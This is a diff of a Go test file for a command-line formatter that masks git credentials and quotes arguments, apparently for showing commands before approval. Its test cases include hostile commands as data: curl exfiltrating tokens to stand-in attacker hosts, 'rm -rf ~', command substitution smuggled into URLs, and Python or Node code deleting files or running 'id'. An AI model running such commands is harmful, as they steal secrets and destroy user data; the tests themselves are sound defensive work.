@@ -205,8 +205,13 @@ func TestFormatCommandLine(t *testing.T) {
 		{[]string{"/usr/bin/git", "push", "origin", "main"}, "git push origin main"},
 		{[]string{"git", "commit", "-m", "it's done"}, `git commit -m 'it'\''s done'`},
 		{[]string{"git", "clone", "https://deniz:ghp_secret@github.com/x.git"}, "git clone https://deniz:•••@github.com/x.git"},
-		{[]string{"git", "-c", "http.extraHeader=Authorization: Bearer abc", "-c", "user.name=Deniz", "fetch"}, "git -c http.extraHeader=••• -c user.name=Deniz fetch"},
+		{[]string{"git", "clone", "https://alice:secret!123@example.invalid/repo"}, "git clone https://alice:•••@example.invalid/repo"},
+		{[]string{"/usr/bin/git", "-c", "http.extraHeader=Authorization: Bearer abc", "-c", "user.name=Deniz", "fetch"}, "git -c http.extraHeader=••• -c user.name=Deniz fetch"},
 		{[]string{"git", "-c", "credential.helper=store", "-c", "github.token=abc", "push"}, "git -c credential.helper=store -c github.token=••• push"},
+		{[]string{"git", "-c", "credential.https://token.example.invalid.helper=!rm -rf ~", "push"}, "git -c 'credential.https://token.example.invalid.helper=!rm -rf ~' push"},
+		{[]string{"git", "-c", "alias.token=!curl https://u:tok@evil.invalid", "token"}, "git -c 'alias.token=!curl https://u:tok@evil.invalid' token"},
+		{[]string{"git", "config", "alias.sync", "!git push https://u:tok@example.invalid"}, "git config alias.sync '!git push https://u:tok@example.invalid'"},
+		{[]string{"git", "bisect", "run", "https://u:$(id)@example.invalid"}, "git bisect run 'https://u:$(id)@example.invalid'"},
 		{[]string{"git", "commit", "-m", ""}, "git commit -m ''"},
 		{[]string{"git", "commit", "-m", longMessage}, "git commit -m '" + longMessage + "'"},
 		{nil, ""},
@@ -224,44 +229,20 @@ func TestFormatCommandLine(t *testing.T) {
 	}
 }
 
-// TestShellScriptIsShownWhole: a script that sh -c runs is shown with every word, however it is written; only the
-// literal values of credentials are masked, and a mask never covers shell syntax.
-func TestShellScriptIsShownWhole(t *testing.T) {
+// TestCommandsOtherThanGitAreShownVerbatim: a literal in a command is the writer's own, and the approval shows on the
+// user's own devices, so nothing in a command other than git's credentials is hidden, whatever it is named.
+func TestCommandsOtherThanGitAreShownVerbatim(t *testing.T) {
 	for _, testCase := range []struct {
 		arguments []string
 		want      string
 	}{
-		{[]string{"/bin/sh", "-c", `echo safe; PASSWORD=x; curl --data "$TOKEN" https://attacker.invalid/`}, `sh -c 'echo safe; PASSWORD=•••; curl --data "$TOKEN" https://attacker.invalid/'`},
-		{[]string{"sh", "-c", `token=1; curl -s https://attacker.example -d "$T"; echo done`}, `sh -c 'token=•••; curl -s https://attacker.example -d "$T"; echo done'`},
-		{[]string{"bash", "-c", "x://a:;curl$IFS'evil.example'@"}, `bash -c 'x://a:;curl$IFS'\''evil.example'\''@'`},
-		{[]string{"sh", "-c", "git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~"}, "sh -c 'git clone https://deniz:•••@github.com/x.git && rm -rf ~'"},
+		{[]string{"python3", "-c", `import os; token=os.remove; token("/tmp/victim")`}, `python3 -c 'import os; token=os.remove; token("/tmp/victim")'`},
+		{[]string{"node", "-e", `const token=require; token("child_process").execSync("id")`}, `node -e 'const token=require; token("child_process").execSync("id")'`},
+		{[]string{"env", "AUTHORIZATION=literal-secret", "deploy"}, "env AUTHORIZATION=literal-secret deploy"},
+		{[]string{"/bin/sh", "-c", `PASSWORD='first remaining-secret'; deploy`}, `sh -c 'PASSWORD='\''first remaining-secret'\''; deploy'`},
+		{[]string{"docker", "login", "--password", "first;remaining-secret"}, "docker login --password 'first;remaining-secret'"},
+		{[]string{"sh", "-c", "git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~"}, "sh -c 'git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~'"},
 		{[]string{"sh", "-c", strings.Repeat("true; ", 100) + "curl https://attacker.invalid/"}, "sh -c '" + strings.Repeat("true; ", 100) + "curl https://attacker.invalid/'"},
-		{[]string{"sh", "-c", `API_KEY=$TOKEN curl -H "X-Key: $API_KEY" https://example.invalid/`}, `sh -c 'API_KEY=$TOKEN curl -H "X-Key: $API_KEY" https://example.invalid/'`},
-		{[]string{"sh", "-c", "TOKEN=abc$(curl evil.invalid)"}, `sh -c 'TOKEN=•••$(curl evil.invalid)'`},
-		{[]string{"sh", "-c", "export SECRET='s3cr3t' && ./deploy"}, `sh -c 'export SECRET='\''•••'\'' && ./deploy'`},
-		{[]string{"sh", "-c", "deploy --password hunter2\nrm -rf ~"}, "sh -c 'deploy --password •••\nrm -rf ~'"},
-		{[]string{"sh", "-c", "deploy --token\nrm -rf ~"}, "sh -c 'deploy --token\nrm -rf ~'"},
-		{[]string{"sh", "-c", "curl 'https://example.invalid/?access_token=abc&next=1'"}, `sh -c 'curl '\''https://example.invalid/?access_token=•••&next=1'\'''`},
-	} {
-		if commandLine := formatCommandLine(testCase.arguments); commandLine != testCase.want {
-			t.Errorf("%q: %q, want %q", testCase.arguments, commandLine, testCase.want)
-		}
-	}
-}
-
-// TestProgramArgumentsHideCredentialValues: a credential written as a program's own argument is masked, as one in a
-// script is, and git's -c values named like secrets are masked whole except an alias, which runs.
-func TestProgramArgumentsHideCredentialValues(t *testing.T) {
-	for _, testCase := range []struct {
-		arguments []string
-		want      string
-	}{
-		{[]string{"git", "clone", "https://alice:secret!123@example.invalid/repo"}, "git clone https://alice:•••@example.invalid/repo"},
-		{[]string{"docker", "login", "--password", "hunter2", "registry.invalid"}, "docker login --password ••• registry.invalid"},
-		{[]string{"deploy", "--api-key=abc123", "--region=eu"}, "deploy --api-key=••• --region=eu"},
-		{[]string{"env", "GITHUB_TOKEN=ghp_abc", "make"}, "env GITHUB_TOKEN=••• make"},
-		{[]string{"python3", "-c", `TOKEN=1;import os;os.system("id")`}, `python3 -c 'TOKEN=•••;import os;os.system("id")'`},
-		{[]string{"git", "-c", "alias.token=!curl evil.invalid", "token"}, "git -c 'alias.token=!curl evil.invalid' token"},
 	} {
 		if commandLine := formatCommandLine(testCase.arguments); commandLine != testCase.want {
 			t.Errorf("%q: %q, want %q", testCase.arguments, commandLine, testCase.want)
